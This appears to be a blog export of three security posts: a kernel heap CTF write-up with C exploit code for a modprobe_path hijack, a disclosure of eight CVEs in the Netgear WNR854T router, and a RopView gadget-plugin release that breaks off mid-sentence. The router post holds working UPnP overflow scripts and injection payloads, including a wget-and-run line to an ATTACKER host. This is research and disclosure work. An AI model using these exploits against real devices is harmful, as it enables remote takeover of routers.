[ { "title": "Ringbus: Deferred Free Across Caches (Writeup)", "url": "/posts/ringbus/", "categories": "CTF", "tags": "CTF, kernel, slub, heap, uaf", "date": "2025-10-31 00:00:00 -0400", "content": "A writeup for the challenge I contributed to RSTCON25. The objective is to priv to root using kernel heap vulnerabilities, looping bugs, and heap spraying. Table of contents Overview Module and Exploit Considerations Environment Setup A Quick Primer on SLUB Exploitation Primitive 1: Read-after-free Primitive 2: Type-Confusion to Overflow to AAW Scan Devices and Trigger Closing Thoughts Overview This is the official writeup for a kerenl challenge I developed for RSTCON 2025 including coverage of the module, environment setup, as well as a general overview of SLUB exploitation, incase this is an unfamiliar topic. As usual, the remote runs a kernel with the module loaded and the user must exploit this module to achieve root privileges. This challenge tests your ability in obtaining kernel and cache leaks from heap primitives and spraying a target object into place in addition to abusing other bugs to achieve an AAW. The module simulates a serial manager which stores configuration settings and offers functions for a list of devices. Notably you can add many devices, each which contain their own ring buffer which can be RX/TX to. The goal of this challenge is to build up a primitive to hijack modprobe_path. Provided in this post is the dist.tar incase you want to follow along. The module source is provided for this challenge. Module and Exploit Looking at the source provided in dist.tar reveals key information about the binary, considerations for exploitation, and a better overall picture as to what the module does and how it actually does it. Let’s go over some of the structures and handlers. struct devices Doubly linked list of struct uart_ring, the module uses this list to select (dev_select) and add (dev_new) devices. struct uart_ring Stores information about a device including a head, tail, and a seek used in TX/RX. It also includes usage metadata and options configurable by ioctls. get/add The former returns the uart_ring given the index, the latter adds a device at the end of the devices list. rx_handle Copies data from userspace into selected_dev-&gt;head the length copied is determined at runtime in the following manner: If the lengh n, provided in write(,,n) is less than selected_dev-&gt;len, then n is used. It is also validated that selected_dev-&gt;len is less than RING_SIZE. Otherwise, selected_dev-&gt;len is used as a fallback size. tx_handle Copies data from the selected device’s ring buffer into a userspace buffer, one byte at a time. This uses the seek attribute and will wrap back to the head if the end of the buffer is encountered. If the least significant nibble of t_setting for the selected device is enabled, a re-transmission mode will be enabled where TX will try on bytes that fail. Otherwise failed bytes will be skipped. ioctl RST Resets seek and marks the selected device as not in-use. ioctl LEN_SET Sets selected device’s length used for comparison (or as n) in rx_handle. ioctl tx_setting Sets selected_dev-&gt;t_setting. That was quite a bit, but it is important to have atleast a general understanding of the module, the userspace interactions, and how it handles allocations with respect to the available userspace attack surface mappings. We know from this we are able to add an arbitrary amount of devices which allow us to read/write into allocations and in which the module itself decides whether to release a device or not. Knowing this, lets look at some of the deeper exploitation considerations that become apparent after looking at these functions and objects. rx_handle does not wrap Unlike tx_handle, rx_handle will not wrap to the head if seek goes out of bounds and instead trusts the prior length validations to be safe. RST deferred free RST marks the selected device as no longer inuse, but does not actually free it at this time. This is done later either when RST is called again, or when RX/TX is called. Cache locations Both devices and uart_ring-&gt;buf are stored in kmalloc-cg-32 while the uart_ring itself is allocated into kmalloc-cg-64. All allocations made by the program set GFP_KERNEL_ACCOUNT. It is important to know which caches interesting objects live in so that we are better prepared when we break the chains and start thrashing around in the SLABs. tx_handle arbitrary looping An arbitrary loop can be toggled in tx_handle causing the function to continuously copy_to_user. This is done by setting t_settings. Likewise, the loop can also be exited arbitrarily. t_settings unsigned long and controllable This attribute is an unsigned long type and entirely controllable, making it a perfect candidate for storing a fake address (such as for an AAW!). Recall, that this is a member of uart_ring so it lives in kmalloc-cg-64. Keep these considerations in mind as we progress through our exploit. Next we’ll talk about environment setup, feel free to skip this section if you’ve done kernel challenges before. Environment Setup Unlike userspace binaries, for kernel modules we must emulate the kernel itself with the loaded target since bugs in our module can crash the kernel and the exploit primitives will heavily utilize kernelspace and kernel objects. The local environment you create for a kernel CTF is very similar to the environment being forked to you from the remote server. A local solve environment consists of a: bzImage The same kernel image being run on the remote. The image provided is non-stripped. initramfs The file system used by the emulation. Contains the target module and should have a modified /init to drop us in a root shell after booting. Here we can also mount a hostshare (which we will expose from qemu) so that we can directly access our exploits from our test environment without having to transfer our exploit each time. A script that launches our qemu environment From our launch script we can also toggle on and off mitigations such as nokaslr. The main thing we want in our testing environment is a way to be root (so we can read kallsyms) and a way to recompile and run our exploits without transferring it over the network. All you need to modify for this is /init in initramfs like so: ... mkdir /mnt/hostshare &amp;&amp; mount -t 9p -o trans=virtio hostshare /mnt/hostshare exec su -l root You will need a script to decompress and rebuild the filesystem respectively, with our changes to init. You are also able to open a debugging port on your qemu instance using -s. Combined with our non-stripped vmlinux (which can be obtained from our bzImage using online tools), we are able to launch a rooted qemu instance and debug it with symbols locally. An example qemu launcher is given: #!/bin/sh qemu-system-x86_64 \\ -m 128M \\ -nographic \\ -kernel \"./bzImage\" \\ -append \"console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on kaslr\" \\ -no-reboot \\ -monitor none \\ -cpu qemu64,+smep,+smap \\ -initrd \"./initramfs.cpio.gz\" \\ -fsdev local,security_model=passthrough,id=fsdev0,path=./src \\ -device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare \\ -s pwndbg has some really easy to use slab commands, although they rely on symbols being present in your kernel. A Quick Primer on SLUB Exploitation Given that this challenge relies on heap vulnerabilities, I think it would be useful to quickly go over some SLUB exploitation, which is the SLAB-based allocator used by the Linux kernel. While a kernel heap sounds scary, I personally find it easier than userland glibc-based heap exploitation. SLAB allocators are based on type and size caches and lack the complex best-fit, first-fit, remaindering, and other complex search paths and chunk carving that userland heap does to most optimally service a request. The underlying system design differences between the two allocator choices is apparent, where userland programs may allocate complex and indeterminable program-specific objects, the kernel is almost always limited to objects from the kernel and its subsystems, this also helps avoid fragmentation. Check out pwn.college’s series on kernel exploitation for some great resources on learning about slab allocators and the heap-specific protections in the linux kernel here. In this short section, we will be discussing only some of allocator internals and exploitation techniques nessecary to complete this challenge. But below are some great resources I’ve found particularly helpful when it comes to kernel exploitation: pwn.college slide deck Heap spraying and modprobe Kernel pwn series Codeql for finding useful kernel objects Kernel object searcher kmalloc caches kmalloc returns locations from general-use caches, which are able to hold many different object types. While there are object-specific caches and caches that will be allocated to depending on the kmalloc flag, these general-use caches are used by all processes. Namely, caches are organized based on the sizes of their blocks (although as mentioned, dedicated caches are sorted based on other factors such as object similarity and isolation). For example, if I use a kernel object that is dynamically sized based on a custom attribute, it might live in the kmalloc-32 cache if its headers alone are less than 32 bytes. However, if I rewrite that attribute, that same object might live in kmalloc-512! All slots for allocation in a cache slab are the fixed support size and no metadata is stored inline. Furthermore, unlike glibc’s malloc, kmalloc does not go through a complex flow map of where to cite a freed block given a variety of freelists and instead, freed slots are simply pushed onto the head of a single, singly linked freelist. If you’re curious about the caches available for servicing allocation requests you can read /proc/slabinfo. Heap Spraying Like any allocator, SLUB is reliant on its fair share of heap mitigations. Some of these include safe linking on freed chunks pointers, verification on copy_to_user and copy_from_user to avoid OOB writes, and freelist randomization. The last one is particularly interesting to us as it results in allocation patterns like this since contiguous slots are not guaranteed to be returned. This makes it particularly difficult to take advantage of use-after-free bugs, as we are not guaranteed the object we want, or anything at all, is residing in our victim chunk. Luckily, given the large amount of kernel objects available to us with their varying sizes, we can achieve many different exploitatable scenarios by simply mass-allocating a target object until they land in our UAFed slot. Some of these objects contain function pointers, kernel pointers, and cache pointers. List of useful kernel objects Lastly, it is important to note that slabs for different caches do not live in adjacent memory, meaning I can’t spray into a region in kmalloc-64 given a allocations made into kmalloc-32 (atleast in simple scenarios, this can in fact be manually triggered, read more into the padding spray method of cross-cache attacks) Primitive 1: Read-after-free Now that we have a grasp on kernel heap exploitation, we can move on to our first primitive, which is a read-after-free. The first bug takes advantage of the deferred free in RST and the copy_to_user loop which can be triggered by setting the retransmission flag in selected_device-&gt;t_settings as mentioned earlier. A check is done at the beginning of the TX function to ensure the selected device has not been marked free by RST, but we are able to pass this check, trigger the loop, and then call RST on the device while it is still being read from. Specifically, we will continue reading from selected_device-&gt;buf (now freed) in a circular fashion. Note that to actually trigger the re-transmission loop, the setting has to be set in addition to the fact that the userspace address provided actually has to cause copy_to_user to fail. This could be done in a theoretically large number of ways such as by using mprotect, madvise, or by simply unmapping the buffer. We will use this vulnerability to leak a kernel address and a kmalloc-cg-64 address, thereby we will trigger it twice in our exploit. Before proceeding, we need to add this new device to the module, select it, and configure it to fail. char buf[64] = \"Something\"; leak_buf = malloc(0x1000); long oob_dev; // used later // Open and save fd open_device(); // Device 1 // - Bad t_settings fill_new_dev(buf); ioctl(fd, TX_INSIST_MODE, 0x10); leak_buf will be used going forward to read all leaks. oob_dev will be used in the future for a different primitive. fill_new_dev adds a device and then writes data to it (a device can only be read from after it has been written too atleast once). The last ioctl will cause retransmission (0x10 &amp; 0x1 != 1). I chose to leak a kernel address first. It should not matter what order you decide for your leaks, just be sure to account for it in the remainder of the exploit. Spraying devices second is more convenient here because we use the sprayed devices to craft a later primitive. The vulnerability can be triggered in the same way and the only factor that will realistically change is what object you choose to spray into the freed slot. seq_ops spray (Kernel Leak) I chose to spray seq_ops to obtain the kernel leak. The first step to trigger this bug is to prepare our userspace leak_buf so that it is invalid or not writable, therefore causing copy_to_user to fail. We will then utilize a simple read thread to allow us to perform other interactions during the read loop. Here I simply use mprotect to remove permissions and then start the read thread. // Disallow leak_buf so TX loop is triggered mprotect(leak_buf, 0x1000, PROT_NONE); puts(\"[*] Starting read thread against unmapped region\"); // Read forever in a seperate thread pthread_create(&amp;read_tx, NULL, uaf_thread, NULL); As mentioned, the thread simply does: void *uaf_thread(void *arg) { printf(\"UAF Thread\"); read(fd, leak_buf, 0x1000); } Now that we are in a read loop, we can free selected_device-&gt;buf. In the main thread, we call RST twice. The first time marks buf as not in use, the second frees it because it is already marked. RX/TX are solely responsibly for later reallocating buf if it is not in-use. This gives us a read-after-free since we have already passed that point in the code. We can take advantage of this by spraying an object into kmalloc-cg-32 (recall buf is 32 bytes) until it lands in the freed slot and is eventually read back into leak_buf by the reader thread. I chose to spray with sequence_ops because it contains kernel points and lives in kmalloc-cg-32. Results of this clearly show that the proc_single_show symbol was leaked: Below is the code for this leak: /** * Leak KASLR address by: * - Cause a TX loop * - Trigger deferred free using RST * - Spray with seq_ops (contains kernel ptr) * - Unloop and parse tx buf */ void kaslr_leak(void){ int spray[spray_size]; // Disallow leak_buf so TX loop is triggered mprotect(leak_buf, 0x1000, PROT_NONE); puts(\"[*] Starting read thread against unmapped region\"); // Read forever in a seperate thread pthread_create(&amp;read_tx, NULL, uaf_thread, NULL); sleep(1); // RST 1: Reset seek ioctl(fd, RST); // RST 2: free buf ioctl(fd, RST); puts(\"[+] Successfully RST\"); // Fill hole with seq_op (kmalloc-cg-32) puts(\"[*] seq_op spray\"); for(int i = 0; i &lt; spray_size; i++){spray[i] = open(\"/proc/self/stat\", O_RDONLY | O_NOCTTY);} // Hole filled with seq_op, end TX loop puts(\"[*] Re-mapping user buffer\"); mprotect(leak_buf, 0x1000, PROT_READ | PROT_WRITE); pthread_join(read_tx, NULL); modprobe_path = parse_leak_buf(kaslr_mask, kaslr_leak_index, modprobe_path_offset); // Free seq_ops for(int i = 0; i &lt; spray_size; i++){close(spray[i]);} } device spray (kmalloc-cg-64 Leak) To craft my final primitive I ended up also needing a kmalloc-cg-64 leak so that I am able to forge a fake uart_ring. To do this I use the same bug, but this time spray devices. Recall that devices are a doubly linked list of ring buffers so I will actually be leaking a uart_ring directly. This all re-occurs in the kmalloc-cg-32 cache, which is why I first free my seq_ops from the first leak. Furthermore, these sprayed devices will prove a useful target for a later primitive so I leave them after spraying. Code: /** * Leak kmalloc-cg-64 address by: * - Cause a TX loop * - Trigger deferred free using RST * - Spray with devices (next,prev ptrs) * - Unloop and parse tx buf */ void cg_64_leak(void){ // Start TX loop mprotect(leak_buf, 0x1000, PROT_NONE); pthread_create(&amp;read_tx, NULL, uaf_thread, NULL); sleep(1); // RST race again ioctl(fd, RST); ioctl(fd, RST); ioctl(fd, RST); // Spray devices for kmalloc-cg-64 leak // Will also scan list later for AAW for(int i = 0; i &lt; spray_size; i++) devices[i] = add_dev(); // Hole filled with device, end TX loop puts(\"[*] Re-mapping user buffer\"); mprotect(leak_buf, 0x1000, PROT_READ | PROT_WRITE); pthread_join(read_tx, NULL); kmalloc_cg_64 = parse_leak_buf(cg_64_mask, cg_64_index, fake_head_offset); } Now we have all needed leaks. Primitive 2: Type-Confusion to Overflow to AAW Type Confusion This vulnerability is within the RX functionality and relies on a type confusion between selected_device-&gt;len and the length ultimately chosen in rx_handle. It is then used to set a very large n argument to copy_from_user and overflow a 32-byte selected_device-&gt;buf. Below better illustrates the issue: length checks that dev-&gt;len is less than RING_SIZE-1. Recall that dev-&gt;len is set using an ioctl as a default signed int, but returned here as an unsigned long. A user can set dev-&gt;len beforehand so that it wraps to a negative value (ioctls take an unsigned long argument so you can’t pass a negative value explicitly, so you must also wrap the int when initially setting it), then when this function is called, the comparison will be passed and ret will equal some very large value since length returns a negative value as an unsigned long. Because ret is now very large, any len value passed via write will pass the dev-&gt;len comparison and be accepted. Our n argument from write(,,n) will be used to copy from userspace to kernelspace selected_dev-&gt;buf in kmalloc-cg-32. We can choose an arbitrary n and have very granular control as to the size of the overflow. We use it in the future to only write one address length out of bounds. Slab Overflow Recall the devices we sprayed into kmalloc-cg-32 for our first leak. These would prove excellent candidates to change because they’d let us change a device in the devices list to craft an arbitrary uart_ring. But do note that RX writes dev_selected-&gt;head. This means that the address we use should point 8 bytes ahead of an address we’d like to write too. The game plan is illustrated below: As seen here, we take advantage of this overflow to craft the following AAW to overwrite modprobe_path. Using our uart_ring leak from earlier, we overwrite our (hopefully) adjacent device pointer so that it instead points to our leaked uart_ring+32 this will shift the device so that the t_setting is instead treated as the head which we will write too later. As mentioned earlier, t_setting is an unsigned long and we are able to set it, making it a perfect address holder. We opt here for the to achieve root command execution. We should utilize this technique after ensuring all devices from the earlier spray are setup in such a way that allows us to use them in this manner since we do not know which device may be adjacent to our overflow. This scanning process brings us to the final section. Scan Devices and Trigger Given that we have no way of knowing which device or even if a device will be adjacent, the reliability concern of the exploit is finally raised here. Assuming we are not unlucky, we need to ensure that each device from the earlier spray is configured in such a way that it gives us our final primitive. So, we must set up and treat each device as if it is adjacent to our overflow in kmalloc-cg-32. Here, I simply save a device which I will use for the overflow primitive later, then I scan the saved devices from earlier, updating the length so that I can copy at least 64 bytes to the location, and the t_setting so that it points to our calculated modprobe_path. /** * Arbitrary Write */ oob_dev = add_dev(); // Configure all devices as if they landed adjacently to oob_dev // - len = 64 // -- So we can RX plenty of data into uart_ring-&gt;head // - t_setting = &amp;modprobe_path // -- This is so we can use t_setting as a fake uart_ring-&gt;head for(int i = 0; i &lt; spray_size; i++){ select_dev(devices[i]); len_set(64); ioctl(fd, TX_INSIST_MODE, modprobe_path); } After this is complete, I can use the overflow, and then write my fake modprobe path to each device in the list. // Trigger length integer overflow // - length() will return dev-&gt;len (int) as an unsigned long // -- Magic number below will wrap so that dev-&gt;len is negative // - Since arg0 (from write arg) &lt; arg1 (len_set) arg0 is used // - Can call write w/ arbitrary length argument select_dev(oob_dev); len_set(5368324604406717569); // Payload // - Padding // -- Recall RING_SIZE = 32 // - Fake uart_ring // -- Misalign uart_ring leak from earlier so that // -- uart_ring-&gt;head points to t_settings (RX writes to head) int offset = 32; char payload[offset+8]; memset(payload, 0x41, offset); memcpy(payload+offset, &amp;kmalloc_cg_64, sizeof(kmalloc_cg_64)); write(fd, &amp;payload, offset+8); // Scan AAW // - One of these devices is hopefully adjacent to oob_dev // - Send \"/tmp/e\" to all devices until modprobe_path is overwritten // - \"/tmp/e\" will be our fake modprobe binary char * path = \"/tmp/e\"; for(int i = 0; i &lt; spray_size; i++){ select_dev(devices[i]); write(fd, path, 8); } // Hopefully that worked // Attempt modprobe_path hijack get_flag(); Final solve in action: Closing Thoughts Although I was directed to make a challenge that was embedded themed, I also really wanted to make my first kernel heap challenge, so I thank you for suspending disbelief and accepting that an embedded device would use a semi-recent kernel or (more obviously) a SLUB allocator. I designed this challenge to highlight some recurring themes one might find when doing vulnerability research in kernel modules such as bad lifetime management (deferred frees + race windows) compound into powerful primitives when paired with general allocator exploitation techniques such as heap spraying. The intentional exploit path here, was intentionally layered and sequential, leak, spray, type confusion, overflow, and finally AAW. Some other exploitation scenarios to consider (and perhaps try, reach out if you do), could entail only using the first leak primitive. One could break safe linking by both reading an fd and a NULL fd in the same slab, allowing one to link a fake block. Furthermore, a player also made me aware of how they were able to use solely the first primitive by causing a kernel panic to leak the flag (initramfs is scannable in memory with qemu). Below is that conversation. If you enjoyed this challenge, you may like digging into: Looking at some real CVEs in linux subsystems, alot of which utilize heap spraying. pwn.college’s kernel exploitation material. More interesting writeups that touch on bypassing other mitigations and cross-cache attacks. Good luck and happy pwns!" }, { "title": "'You Left this on the Internet?' Finding 8 Zero Days in the WNR854T for DistrictCon Junkyard", "url": "/posts/8-cves-on-the-wnr854t-junkyard/", "categories": "Vulnerability Discovery", "tags": "firmware rev, embedded", "date": "2025-03-25 00:00:00 -0400", "content": "A subsect of student members from the Mason Competitive Cyber Club conducted research on an EOL device in preparation for the Junkyard contest at DistrictCon Year 0, unearthing eight new CVEs. Table of contents Intro and Background The Junkyard Competition Disclosure Timeline A Note on post.cgi Vulnerabilities Discovered CVE-2024-54802 CVE-2024-54803 CVE-2024-54804 CVE-2024-54805 CVE-2024-54806 CVE-2024-54807 CVE-2024-54808 CVE-2024-54809 Intro and Background The following post features technical details regarding vulnerabilities that were discovered in an EOL device by my school’s cybersecurity club in preparation for a competition at the inaugural DistrictCon security conference. For the past few months, Mason Competitive Cyber has been researching a target—namely the Netgear WNR854T—for security vulnerabilities, a project run by students and sponsored by club funds. The research resulted in the discovery of eight previously unknown security issues, including vulnerabilities that allow for code execution from the WAN and payload injection into NVRAM that persists and triggers across reboot. Proof of concepts were developed and demonstrated live to convey the impact of the discovered issues and showcase the low-hanging fruit that frequently still exist in embedded systems. Points of contact and timelines were kept with both the DistrictCon organizers and the vendor to ensure a 90‑day responsible disclosure window. Bugs mainly consist of improper system calls and memory corruption within both the router’s UPnP and httpd services. Notes: All issues found with UPnP are unauthenticated (as the protocol traditionally is) and the router’s UPnP service is exposed to the WAN. The router’s httpd UI allows direct NVRAM modification (requires authentication), enabling chains such as: Using UPnP to port-forward the webshell to the internet. Changing credentials via NVRAM edits in the web UI or via UPnP bugs. Our testing and weaponization used local firmware copies and a UART interface. A JTAG header is also exposed and can be used to reflash the router in the event of bricking or boot loops (possible with persistent NVRAM bugs). The Junkyard Competition The Junkyard competition was an end‑of‑life pwnathon for disclosing zero‑days on end‑of‑service devices with prize categories for most memeable target, most impactful target, most novel technique, and their runners‑up. Competitors had ten minutes to demonstrate live PoCs against their targets. Devices had to be officially EoS/EoL (and initially, vulnerabilities needed CVEs). The Mason Competitive Cyber team consisted of researchers vWing, draz, and elbee. We chose the Netgear WNR854T, which was readily available (previously used in draz’s home). The team was approved for two talk slots to demonstrate seven of the eight vulnerabilities live. It was found the target device had only one previously reported unauthenticated command execution issue; we expected additional “easy wins.” Many props to DistrictCon for running a uniquely fun contest and a surprisingly high‑quality first‑year conference (even without power!). Disclosure Timeline A Note on post.cgi There exists an httpd route that allows configuring arbitrary system information—post.cgi (requires authentication). In the posted data, a command key can contain: device_data, reset_to_default, system_restart, system_reboot. The device_data path lets an authenticated user arbitrarily set NVRAM entries. Various NVRAM parameters are consumed by both httpd and sysinit, enabling persistent and non‑persistent command‑injection scenarios. Vulnerabilities Discovered MSEARCH Host BOF (CVE-2024-54802) Summary. Stack‑based BOF in UPnP (/usr/sbin/upnp) on M-SEARCH Host header. Root cause is an unbounded strcpy into a fixed‑size stack buffer inside advertise_res (0x22bc4), allowing memory corruption and RCE. Vulnerable component. advertise_res copies the Host header into a local buffer using strcpy with no bounds checking. Attack type/impact. Unauthenticated, remote. UPnP runs on the WAN. Successful exploitation yields RCE. Attack vector. Malicious M-SEARCH with an oversized Host header. Overwrites return state and hijacks control flow. Exploitation. Overwrite saved LR/PC and pivot into a gadget at 0x2d4dc (mov r0, r5 ; bl system) to invoke system() with an attacker‑controlled argument. payload_pt1 = b'Z' * 304 payload_pt2 = b'A' * 4 # R4 payload_pt2 += b'B' * 4 # R5 - command str will go here payload_pt2 += b'C' * 4 # R6 payload_pt2 += b'D' * 4 # R7 payload_pt2 += b'E' * 4 # R8 payload_pt2 += b'ÜÔ' # 0x2d4dc mov r0, r5 ; bl system def send_msearch_pwn(target_port=1900): global payload_pt1, payload_pt2 ret = p32(0xbeffeb20 + (len(cmd.encode()) * 3) + 1) payload_pt2 = payload_pt2.replace(b'BBBB', ret) message = ( payload_pt1 + b'\\r\\n' + payload_pt2 + b'\\r\\n' + b'MAN:\"ssdp:discover\"\\r\\n' b'MX:2\\r\\n' b'\\r\\n' ) + p32(0xdeadbeef) + (b\" \" * 255) + cmd.encode() with socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) as sock: sock.settimeout(2) sock.sendto(message, (host, target_port)) PPPOE_PEER_MAC Authenticated Command Injection (Boot Persistent) (CVE-2024-54803) Summary. Authenticated command injection in /bin/sysinit via NVRAM pppoe_peer_mac. Unsanitized value is inserted into a sprintf format and executed via system() during boot, yielding persistent root‑level execution when wan_proto=pppoe. Exploit format. pppoe_peer_mac=;command_to_execute # Example: pppoe_peer_mac=;{wget http://ATTACKER/m.sh -P /tmp/ &amp;&amp; /tmp/m.sh} # Steps: Set wan_proto=pppoe. Set pppoe_peer_mac to injected payload. Reboot; command runs with root at startup. WAN_HOSTNAME Authenticated Command Injection (Boot Persistent) (CVE-2024-54804) Summary. Authenticated command injection in /bin/sysinit via wan_hostname; value flows to: sprintf(var, \"netbios %s %s &amp;\", r4, r3) // r3 = wan_hostname Executed later via system(), persisting across reboots. Exploit format. wan_hostname=;command_to_execute # Example (change admin password): wan_hostname=;nvram set http_passwd=pwnd # Sendmail Authenticated Command Injection (CVE-2024-54805) Summary. Authenticated command injection in /bin/httpd email alerts flow. email_address NVRAM is placed into: /bin/sendmail %s -f %s &amp; No sanitization; backtick injection allows arbitrary command execution, triggerable on demand via /send_log.cgi. Exploit example. `wget http://ATTACKER/m.sh -P /tmp/`@example.com Workflow: set malicious email → enable alerts → call /send_log.cgi. Authenticated Webshell (CVE-2024-54806) Summary. A rudimentary webshell exists at cmd.cgi (0x15c50). Execution is authenticated (tied to post.cgi). Output formatting is poor but functional. AddPortMapping Command Injection (CVE-2024-54807) Summary. Unauthenticated command injection in UPnP AddPortMapping (0x2b530) of /upnp/control/WANIPConnection1. The NewInternalClient argument is concatenated into an iptables command that flows to system() (0x2d3bc). WAN‑facing. Exploit idea. &lt;NewInternalClient&gt;192.168.1.3 $(whoami)&lt;/NewInternalClient&gt; Attackers can remove evidence by deleting the mapping afterward. SetDefaultConnectionService BOF (CVE-2024-54808) Summary. Stack‑based BOF in UPnP L3Forwarding SetDefaultConnectionService (0x28e8c) due to unconstrained sscanf into a local buffer. PC hijack is possible, but weaponization is constrained by XML parsing (ASCII‑only) and return‑address layout. We targeted a known gadget at 0x2d4dc (mov r0, r5 ; bl system). Constraints on weaponization. ASCII‑only payloads (0x20–0x7e), null termination issues. Original RA looks like 0x0002nnnn; partial overwrites are tricky due to deep call graph and dereferences. Single‑byte or null‑byte overwrites crash early (argument setup skipped). Idea for full weaponization. If null‑byte appendage constraints could be bypassed, a two‑byte overwrite may reach a pop;pop;pop;ret to pivot into heap (executable) where shellcode can be staged via request headers, then hit via controlled misalignment / grooming. MSEARCH ST BOF (CVE-2024-54809) Summary. Stack‑based BOF in UPnP parse_st (0x23240) handling M‑SEARCH ST header. An arithmetic error produces an over‑large n passed to strncpy, overflowing a stack buffer and enabling RCE. Attack vector. Oversized ST header inside M‑SEARCH. Unauthenticated, WAN‑exposed. Exploitation. Overwrite saved LR/PC, return to 0x2d4dc (mov r0, r5 ; bl system) with controlled argument. payload = b'Z' * 284 payload += b'A' * 4 # R4 payload += b'B' * 4 # R5 - command str will go here payload += b'C' * 4 # R6 payload += b'D' * 4 # R7 payload += b'E' * 4 # R8 payload += b'\\xdc\\xd4\\x02' # 0x2d4dc mov r0, r5 ; bl system def send_msearch_pwn(target_port=1900): global payload # Space nopsled might shift depending on len(cmd) (+1 for null) ret = p32(0xbefff540 + (len(cmd.encode()) * 3) + 1) payload = payload.replace(b'BBBB', ret) message = ( b'M-SEARCH * HTTP/1.1\\r\\n' b'HOST:239.255.255.250:1900\\r\\n' b'MAN:\"ssdp:discover\"\\r\\n' b'MX:2\\r\\n' b'ST:uuid:schemas:device:' + payload + b':\\x00\\r\\n' b'\\r\\n' ) + p32(0xdeadbeef) + (b\" \" * 255) + cmd.encode() with socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) as sock: sock.settimeout(2) sock.sendto(message, (host, target_port))" }, { "title": "Tool Release: RopView", "url": "/posts/binja-plugin-ropview/", "categories": "Emulation, Tool Release", "tags": "unicorn, pandas, emulation, tool", "date": "2024-06-02 00:00:00 -0400", "content": "Technical explanations and concepts of RopView, a plugin made for BinaryNinja that does gadget analysis. This blog post describes the technical components of this tool. Since the time of writing analysis prestates and presets have been added, along with support for the following architecutres: i386, amd64, armv7, aarch64, thumb2 (toggle),mipsel32, mipsel64, mips32, mips64. Table of contents Foreword Design and Components Compatibility Gadget Discovery Gadget Analyzer Initialization Realtime Contextualizing Step-thru Analysis Semantic Search Filter Closing Foreword I recently published a plugin for BinaryNinja called RopView, a gadget analysis framework that integrates emulation into ROP searching, visualizing memory side effects. For some time now, I’ve been meaning to both develop a tool capable of this, but also contribute another plugin for the BinaryNinja community and found this project to be an excellent way to do both. During the entire development process, considering what would make the exploit developer’s life easier was at the forefront, because I myself wanted to make this something I would use over similar tools when building ROP chains and could easily incorporate into my workflow. What makes RopView different from other return-oriented-programming tools however, is not its interfacing with BinaryNinja’s BinaryView. That honor goes to its powerful gadget analysis and search engine framework, which operate in consort. Design and Components RopView is a visual UI plugin that is registered as an additional BinaryView for the current session. The layout of the plugin involves a tab system with a search filter, which remains accessible from any selected tab. The first tab, which is where the majority of time will likely be spent, is the gadget analysis display. It is made of two panes, a gadget pane, and a focused analysis pane. The gadget pane will display the entire gadget pool with user-specified filters and options applied, or gadgets that service a search request. Under the hood, the gadget pane is a QTreeWidget with scrollable items (via tab or arrow-key navigation). Additionally, double clicking on a selected gadget will navigate to its address in the primary linear BinaryView. Effects of the currently selected gadget are rendered in the analysis pane. Analysis reports consider three focal points (only effected/clobbered memory is analyzed in each): Start state (Before analysis) Effects before gadget executes Instruction states (During analysis) Effects after each instruction in the gadget End state (After analysis) The memory state the gadget leaves behind Analysis is done through gadget emulation and certain algorithmic decisions were made in order to make the emulation as fast as possible. Moreover, analysis details are saved as ‘GadgetAnalysis’ objects, which contain the prestate, step-states, and end-state tied to a gadget address. These objects are cached and used both to resolve an analysis report if a gadget is re-selected and to assist in semantic search functionality. More technical details relevant to the analyzer itself—which will likely be the most interesting aspect of this post—will be discussed later in the relevant section. In between the main window and the search box are two status boxes which display the gadget count (tied to the GadgetPane which could be the full pool or search results) and the search status (success or failure). The second tab contains a chain builder, which was originally going to be included with the first release, but due to certain constraints and focus on the primary functionalities, was not. In the future, gadgets from the GadgetPane will be able to be added and ordered in a list on this pane, which you can then choose or create custom script presets for. The last tab includes configurable settings for both the standard gadget search and analysis prestates. Here register prestates can be explicitly defined and these will be used for all further analysis and semantic searches. Ideally, you’d set the registers you care about to their correct values at the time of controlled execution and further analysis will more accurately reflect what gadgets matter to you given your situation. The only other option which is out of the ordinary is the semantic depth option, which directs how many gadgets deep a query should explore for serviceable gadgets. One of the largest components, which I will briefly talk about but not get deep into because it is uninteresting, is the GadgetRenderer. This pane is responsible for repooling (if an option is changed such as depth, which affects the initial gadget pool) or sorting the current pool (options like bad bytes or duplicates). No matter the caller of GadgetRender, it will always consider the current configuration context when initiating and rendering a GadgetSearch. Speaking of which, the GadgetRender does, and obviously so, have a lot of call sites from various components within the tool. Compatibility Currently this tool only supports i386 and amd64 architectures and an assert needs to be passed for the tool to be successfully initialized. Adding support for ARM and MIPS is one of the most prominent features I’d like to include in the future and will likely be the first thing worked on in future development. Obviously, as a store/load architecture many different components will have to be added to support this and it won’t be as simple as an update to the tool’s constants. For instance, delay slots will need to be considered in gadget exploration as well as how gadget searches are done entirely as both are constant-sized 4 byte instruction sets. Additionally, more gadget querying options would be ideal for both (e.g., for MIPS, queries for stackfinders, li a0, double jumps, etc.). The largest component that will need to be reworked is the GadgetSearch. What would likely require the least reconfiguration would be the GadgetAnalysis, which does diffing and analysis purely based on memory states and does not rely on static checks or heuristics. Gadget Discovery (What exactly IS a gadget?) That stuff was boring and necessary to give a high-level overview of the tool’s primary functionality and design. Now onto the more interesting stuff: actually dealing with gadgets. As mentioned earlier, this tool does everything in-house and does not rely on a third party for actually finding and loading gadgets. Gadget discovery is the first task run by the GadgetRender during initialization and is responsible for finding gadgets within the current BinaryView’s data. The algorithm I am about to talk about for doing gadget searching is specifically tied to the x86 instruction set; different considerations have to be taken for instruction sets like MIPS, as what dictates gadgets differs entirely. This section will be a valuable part of this post, as rarely do I see people actually talk about gadget searching and how we do it. Additionally, it seems like people who are just dipping their toes into binary exploitation sometimes just blindly return to addresses that do things and don’t actually understand, “what makes a gadget?”. We’ll address both of these concepts here. Gadgets in x86 (and any language for that matter) are simple. For x86, a gadget is defined as any address you can return to that decodes to a valid group of instructions and ends with an instruction that lets you control execution flow. Unlike RISC architectures, x86 instructions are not a fixed size; they can be anywhere between 1 and 16 bytes. This matters because it essentially increases the pool of candidate gadgets since you can return to misaligned addresses and walk backwards any n number of bytes and, in a sense, create code that isn’t actually user-defined. The GadgetSearch algorithm searches the binary for potential gadget sites (using regex matching) and then walks back n number of bytes (defined by depth) checking at each step if a gadget exists (valid decoding occurred). It does this until the depth is reached or a gadget-violating condition occurs such as the control instruction 